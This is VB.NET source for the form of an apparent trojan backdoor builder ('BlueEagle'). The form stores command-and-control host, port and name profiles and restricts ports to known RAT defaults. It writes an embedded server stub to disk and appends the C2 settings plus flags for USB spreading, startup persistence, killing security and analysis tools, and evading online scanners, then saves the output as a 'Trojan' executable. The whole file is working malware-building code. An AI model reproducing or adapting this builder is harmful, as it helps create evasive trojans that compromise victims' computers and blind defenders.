Imports System.IO

Public Class backdoorbuilder
    Dim host As String
    Dim port As Integer
    Dim profile As ListViewItem
    Dim AntiTurn As Boolean = False
    Dim SpreadTurn As Boolean = False
    Dim SaveTurn As Boolean = False
    Dim stub, text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim ex As Exception
    Dim s As New SaveFileDialog
    Dim ProfilesDatabase = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "BlueEagleProfiles.txt"
    Dim SaverData As New RichTextBox

    Private Sub backdoorbuilder_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        File.WriteAllText(ProfilesDatabase, SaverData.Text)
    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown, Panel4.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp, Panel4.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove, Panel4.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub





#End Region
    Private Sub backdoorbuilder_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Me.Size = New Size(525, 46)
        Me.Label2.Visible = False
        Me.CheckForIllegalCrossThreadCalls = False
        GroupBox1.Visible = False
        GroupBox2.Visible = False
        GroupBox3.Visible = False
        GroupBox4.Visible = False
        Loading.BackdoorFinished = False
        Timer1.Start()

    End Sub
    Private Sub Load_Profiles()
        SpeakThread("Backdoor Builder Activated sir , All profiles have been loaded")
        On Error Resume Next
        Me.RichTextBox1.Text = File.ReadAllText(ProfilesDatabase)


        For i As Integer = 0 To Me.RichTextBox1.Lines.Length

            'Split Line
            Dim ProfileArray As String() = Split(RichTextBox1.Lines(i), ":")
            Select Case ProfileArray(0)
                Case "Profile"
                    profile = New ListViewItem()
                    profile.Text = ProfileArray(1) & " : " & ProfileArray(2) & " : " & ProfileArray(3)
                    profile.ToolTipText = ProfileArray(1)
                    profile.ImageIndex = 1
                    profile.StateImageIndex = 0
                    ListView1.Items.Add(profile)

            End Select

        Next
        If ListView1.Items.Count < 0 Then
            SpeakThread("Error Sir , No Saved Profiles loaded , check it`s first time to use or not ")
        End If
    End Sub
    Dim currH As Integer = 46
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        '525; 46 small
        '525; 562 normal
        If Me.Height = 562 Then
            Timer1.Stop()
            Label2.Visible = True
            GroupBox1.Visible = True
            connection.Start()

            Exit Sub
        Else
            currH += 86
            Me.Size = New Size(525, currH)
            Me.Refresh()
            Me.StartPosition = FormStartPosition.CenterScreen
            SaverData.Text = ""
        End If
    End Sub

    Dim per As Integer = 0
    Private Sub Loader(ByVal perx As Integer)
        If per = 100 Then
            Exit Sub
        Else
            per = perx
            Me.Refresh()

        End If
    End Sub
    Private Sub DrawLoad(g As Graphics, rect As Rectangle, percentage As Single)
        'work out the angles for each arc
        Dim progressAngle = CSng(360 / 100 * percentage)
        Dim remainderAngle = 360 - progressAngle

        'create pens to use for the arcs
        Using progressPen As New Pen(Color.DeepSkyBlue, 5), remainderPen As New Pen(Color.CadetBlue, 2)
            'set the smoothing to high quality for better output
            g.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
            'draw the blue and white arcs
            g.DrawArc(progressPen, rect, -90, progressAngle)
            g.DrawArc(remainderPen, rect, progressAngle - 90, remainderAngle)
        End Using

        'draw the text in the centre by working out how big it is and adjusting the co-ordinates accordingly
        Using fnt As New Font(Me.Font.FontFamily, 13)
            Dim text As String = ""
            If percentage = 10 Then
                text = "Connection" & vbNewLine & "   Done"

            End If
            If percentage = 20 Then
                text = "Anti" & vbNewLine & "Options"

            End If

            If percentage = 60 Then
                text = " Spread" & vbNewLine & "Options"

            End If
            If percentage = 90 Then
                text = "Save" & vbNewLine & " Profile"

            End If
            If percentage = 100 Then
                text = "Trojan" & vbNewLine & "Saved"

            End If
            Dim textSize = g.MeasureString(text, fnt)
            Dim textPoint As New Point(CInt(rect.Left + (rect.Width / 2) - (textSize.Width / 2)), CInt(rect.Top + (rect.Height / 2) - (textSize.Height / 2)))
            'now we have all the values draw the text
            g.DrawString(text, fnt, Brushes.Lime, textPoint)
        End Using
    End Sub


    Private Sub backdoorbuilder_Paint(sender As System.Object, e As System.Windows.Forms.PaintEventArgs) Handles MyBase.Paint
        If currH = 562 Then
            DrawLoad(e.Graphics, New Rectangle(45, 35, 100, 100), per)
        End If
    End Sub



    Dim groupH As Double = 10.0
    Private Sub connection_Tick(sender As System.Object, e As System.EventArgs) Handles connection.Tick
        '320; 367
        '320; 10


        If groupH < 367.0 Then
            groupH += 36.7
            GroupBox1.Size = New Size(320, groupH)
        Else
            connection.Stop()
            Load_Profiles()
            Button1.Enabled = False
            Button8.Enabled = False
            Exit Sub
        End If
    End Sub

    Private Sub Button8_Click(sender As System.Object, e As System.EventArgs) Handles Button8.Click
        If SaveTurn = True Then
            Exit Sub
        End If
        If SpreadTurn = True Then
            GroupBox4.Visible = True
            GroupBox4.Location = GroupBox3.Location
            GroupBox3.Visible = False
            groupH = 10.0
            ListView1.Enabled = False
            Saver.Start()
            Loader(60) 'spread done
            SpeakThread("Spread Options Have been Saved Sir")
            Exit Sub
        End If
        If AntiTurn = False Then
            GroupBox2.Visible = True
            GroupBox2.Location = GroupBox1.Location
            GroupBox1.Visible = False
            groupH = 10.0
            ListView1.Enabled = False
            Anti.Start()
            Loader(10) 'connection done
            '  Loader(20) 'spread done
            SpeakThread("Setting connection Settings Done Sir")
        End If
        If AntiTurn = True Then
            GroupBox3.Visible = True
            GroupBox3.Location = GroupBox2.Location
            GroupBox2.Visible = False
            groupH = 10.0
            ListView1.Enabled = False
            Spread.Start()
            Loader(20) 'anti done
            SpeakThread("Anti Programs Settings have been saved Sir")

        End If

    End Sub

    Private Sub Anti_Tick(sender As System.Object, e As System.EventArgs) Handles Anti.Tick
        '42; 146
        If groupH < 367.0 Then
            groupH += 36.7
            GroupBox2.Size = New Size(320, groupH)
        Else
            Anti.Stop()
            AntiTurn = True
            Exit Sub
        End If
    End Sub
    ''''''''''''''###################### Animation 
    Private Sub Button1_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button1.MouseHover
        Button1.ForeColor = Color.Lime
    End Sub

    Private Sub Button1_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button1.MouseLeave
        Button1.ForeColor = Color.Snow
    End Sub
    Private Sub Button2_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button2.MouseHover
        Button2.ForeColor = Color.Red
    End Sub

    Private Sub Button2_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button2.MouseLeave
        Button2.ForeColor = Color.Yellow
    End Sub

    Private Sub Button1_Click_1(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Button1.ForeColor = Color.Red
        profile = New ListViewItem()
        host = Hostx.Text
        port = Integer.Parse(Portx.Text)

        profile.Text = Namex.Text & " : " & host & " : " & port
        profile.ToolTipText = Namex.Text
        profile.ImageIndex = 1
        profile.StateImageIndex = 0
        ListView1.Items.Add(profile)

        SaverData.Text &= "Profile:" & Namex.Text & ":" & host & ":" & port & vbNewLine



        Load_Profiles()
    End Sub

    Private Sub Button8_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button8.MouseHover
        Button8.ForeColor = Color.Lime
    End Sub

    Private Sub Button8_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button8.MouseLeave
        Button8.ForeColor = Color.Snow
    End Sub

    Private Sub Button8_Click_1(sender As System.Object, e As System.EventArgs) Handles Button8.Click
        Button8.ForeColor = Color.Red
    End Sub


    Private Sub Hostx_MouseClick(sender As System.Object, e As System.Windows.Forms.MouseEventArgs) Handles Hostx.MouseClick
        Hostx.Select()
        Hostx.Text = InputBox("DNS/Host")
        If Hostx.Text.Equals("Click here") Then
            MsgBox("Error Please Enter Host here")
            Button1.Enabled = False
        Else
            Button1.Enabled = True

        End If
    End Sub

    Private Sub Portx_Click(sender As System.Object, e As System.EventArgs) Handles Portx.Click
        Portx.Select()
        Portx.Text = InputBox("Port")
        If Portx.Text.Equals("Click here") Then
            MsgBox("Error Please Enter Port here [1177 , 54148 , 6740]")
            Button1.Enabled = False



        End If
        If Portx.Text.Equals("1177") Or Portx.Text.Equals("54148") Or Portx.Text.Equals("6740") Then

        Else
            MsgBox("Error Please Enter any port of those only [1177 , 54148 , 6740] ")
            Portx.Text = "Click here"
        End If
    End Sub

    Private Sub Namex_Click(sender As System.Object, e As System.EventArgs) Handles Namex.Click
        Namex.Select()
        Namex.Text = InputBox("Backdoor name")
        If Namex.Text.Equals("Click here") Then
            MsgBox("Error Please Enter Backdoor name here")
            Button1.Enabled = False
        Else
            Button1.Enabled = True

        End If
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        If ListView1.SelectedItems.Count = 1 Then
            Dim ProfileArray As String() = Split(ListView1.SelectedItems(0).Text, " : ")
            dnslabel.Text = "DNS : " & ProfileArray(1)
            portlabel.Text = "Port : " & ProfileArray(2)
            Label8.Text = "Name : " & ProfileArray(0)
            Hostx.Text = ProfileArray(1)
            Portx.Text = ProfileArray(2)
            Namex.Text = ProfileArray(0)
            Button8.Enabled = True
        Else
            dnslabel.Text = "DNS : " & ""
            portlabel.Text = "Port : " & ""
            Label8.Text = "Name : " & ""
            Hostx.Text = "Click here"
            Portx.Text = "Click here"
            Namex.Text = "Click here"
        End If


    End Sub

    Private Sub RemoveProfileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoveProfileToolStripMenuItem.Click
        On Error Resume Next
        Dim TargetIndex As Integer

        If ListView1.SelectedItems.Count = 1 Then
            Dim ProfileArray As String() = Split(ListView1.SelectedItems(0).Text, " : ")
            Dim target As String = ProfileArray(0) & ":" & ProfileArray(1) & ":" & ProfileArray(2)

            For i As Integer = 0 To RichTextBox1.Lines.Length - 1
                If RichTextBox1.Lines(i).Equals("Profile:" & target) Then
                    TargetIndex = i

                    Exit For
                End If
            Next
            RichTextBox1.Select(1, RichTextBox1.GetFirstCharIndexFromLine(TargetIndex)) ' Give your line number
            RichTextBox1.SelectedText = ""
            '(RichTextBox1.Lines(TargetIndex))
            Resave()

        End If

    End Sub
    Private Sub Resave()
        My.Settings.Profiles = RichTextBox1.Text
        ListView1.Items.Clear()
        Load_Profiles()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Closer.Start()
    End Sub

    Private Sub Closer_Tick(sender As System.Object, e As System.EventArgs) Handles Closer.Tick
        '525; 46 small
        '525; 562 normal
        If Me.Height = 46 Then
            Timer1.Stop()
            Me.Close()

            Exit Sub
        Else
            currH -= 86
            Me.Size = New Size(525, currH)
            Me.Refresh()
            Me.StartPosition = FormStartPosition.CenterScreen
        End If
    End Sub

    Private Sub Spread_Tick(sender As System.Object, e As System.EventArgs) Handles Spread.Tick
        '42; 146
        If groupH < 367.0 Then
            groupH += 36.7
            GroupBox3.Size = New Size(320, groupH)
        Else
            Spread.Stop()
            SpreadTurn = True
            Exit Sub
        End If
    End Sub

    Private Sub Saver_Tick(sender As System.Object, e As System.EventArgs) Handles Saver.Tick
        '42; 146
        If groupH < 367.0 Then
            groupH += 36.7
            GroupBox4.Size = New Size(320, groupH)
        Else
            Saver.Stop()
            SpeakThread("You have to Save payload into a new file sir , Please Choose new Filename and click save")
            SaveTurn = True
            Exit Sub
        End If
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        'Save Backdoor
        text1 = dnslabel.Text.Replace("DNS : ", "")
        text2 = portlabel.Text.Replace("Port : ", "")
        text3 = Label8.Text.Replace("Name : ", "")

        start_saving()
    End Sub
    Sub start_saving()
        If text1.Length = 0 And text2.Length = 0 And text3.Length = 0 Then
            MsgBox("Complete Information Please At least Host & Port & Name ", MsgBoxStyle.Critical, "Create Server")
        Else

            s.ShowDialog()
            If s.FileName > "" Then
                
                Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"


                File.WriteAllBytes(temp, My.Resources.Server_New_)
                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & text3 & spl & CheckBox1.Checked & spl & usb.Checked & spl & startup.Checked & spl & processexplorer.Checked & spl & sandboxie.Checked & spl & spythespy.Checked & spl & speadgear.Checked & spl & wireshark.Checked & spl & malwarebytes.Checked & spl & apatedns.Checked & spl & ipblocker.Checked & spl & cports.Checked & spl & processhacker.Checked & spl & antikeylogger.Checked & spl & keyscramber.Checked & spl & cmd.Checked & spl & virustotal.Checked & spl & drivecut.Checked)
                FileClose(1)
                ListBox1.Items.Clear()
                ListBox1.Items.Add("Host : " & text1)
                ListBox1.Items.Add("Port : " & text2)
                ListBox1.Items.Add("Name : " & text3)

                ListBox1.Items.Add("Anti Online Scanner : " & virustotal.Checked)
                ListBox1.Items.Add("Trojan Built In : " & s.FileName)
                Loader(100) 'anti done
                SpeakThread("Trojan was saved Successfully Sir")

            Else
                ListBox1.Items.Add(ex.Message)
            End If
        End If
    End Sub

    Private Sub ClearProfilesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ClearProfilesToolStripMenuItem.Click
        My.Settings.Profiles = ""
        ListView1.Items.Clear()
    End Sub
End Class